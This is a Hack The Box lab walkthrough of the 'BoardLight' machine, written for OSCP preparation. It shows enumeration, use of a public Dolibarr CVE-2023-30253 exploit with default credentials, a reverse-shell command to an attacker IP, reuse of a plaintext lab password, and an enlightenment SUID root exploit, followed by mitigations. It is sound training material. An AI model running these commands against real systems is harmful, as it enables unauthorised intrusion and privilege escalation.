---
title: BoardLight
date: 2025-06-04
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, Linux, Dolibarr-CVE-RCE, enlightenment-SUID-privesc] 
image: board.png
media_subpath: /assets/img/posts/2025-06-04-boardlightHTB/
---

## Introduction

On the easy-rated Linux machine **BoardLight**, I discovered a `Dolibarr` application vulnerable to **CVE-2023-30253** (XSS leading to RCE). Exploiting it granted me a shell as `www-data`. By inspecting the web configuration files, I found plaintext credentials which enabled SSH access. Further enumeration revealed a `SUID` binary from `enlightenment` that was vulnerable to **CVE-2022-37706**. Using this flaw, I escalated privileges and obtained a root shell.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

<aside>
🚨

Run long gobuster scan

</aside>

## Services

### Port 22

Version - OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)

We usually skip SSH.

## Web

### Port 80

Version - Apache httpd 2.4.41 ((Ubuntu))

I saw a domain and added it to `/etc/hosts` file:

![image.png](image%202.png)

**Gobuster Scan**

```bash
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt -t 30 -x .php -b 400,403,404
```

![image.png](image%203.png)

## Exploitation

Vhost Fuzzing

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://board.htb/ -H 'Host: FUZZ.board.htb' -fs 15949
```

![image.png](image%204.png)

I added the subdomain to `/etc/hosts` file and after that navigating there I found `Dolibarr 17.0.0` application, I used `admin`:`admin` and was able to login. Searching for public exploits I found the following blog [post](https://www.vicarius.io/vsociety/posts/exploiting-rce-in-dolibarr-cve-2023-30253-30254) about this vulnerability, and used it and got command execution. 

python3 CVE-2023-30253.py --url http://crm.board.htb -u admin -p admin -c id

![image.png](image%205.png)

Getting a reverse shell:

```bash
python3 CVE-2023-30253.py --url http://crm.board.htb -u admin -p admin -r 10.10.14.34 443
```

![image.png](image%206.png)

![image.png](image%207.png)

I see another user larissa we are supposed to do lateral movement.

![image.png](image%208.png)

## Lateral Movement to Larissa

Let’s get an interactive shell using python first:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

My user is restricted to see only its processes:

![image.png](image%209.png)

I have a [vulnerability](https://github.com/ECU-10525611-Xander/CVE-2022-37706/blob/main/exploit.sh) related to `enlightenment` binary, but for I suppose I should do lateral movement.

![image.png](image%2010.png)

![image.png](image%2011.png)

Searching for Dolibarr credentials I found the following location and found there credentials for `MySQL` database.

![image.png](image%2012.png)

![image.png](image%2013.png)

I didn’t find anything in database, but I used password for larissa user and was able to get a shell as larissa user.

## Privilege Escalation

- OSCP Checklist
    - [ ]  Situational awareness
    - [ ]  Exposed Confidential Information
    - [ ]  Password Authentication Abuse
    - [ ]  Hunting Sensitive Information
    - [ ]  Sudo
    - [x]  SUID/SGID
    - [x]  Capabilities
    - [x]  Cron Jobs Abuse
    - [ ]  Kernel Exploits
    - [ ]  **Check if sudoers file is writable**
    - [ ]  Try credentials you already obtained for various services admin roles
    - [ ]  Check running processes using `pspy`
    

Using the exploit that I found before I was able to get a root shell:

```bash
./exploit.sh
```

![image.png](image%2014.png)

## Credentials

```bash
dolibarrowner : serverfun2$2023!!
Larissa : serverfun2$2023!!
```

## Mitigation

- Update **Dolibarr** to the latest patched version to prevent XSS/RCE.
- Remove sensitive credentials from plaintext config files or secure them with proper file permissions.
- Regularly scan and audit for **SUID binaries**, especially those tied to known CVEs.
- Patch or remove vulnerable components like the affected `enlightenment` binary.
- Use application isolation or sandboxing for web services to limit exposure.
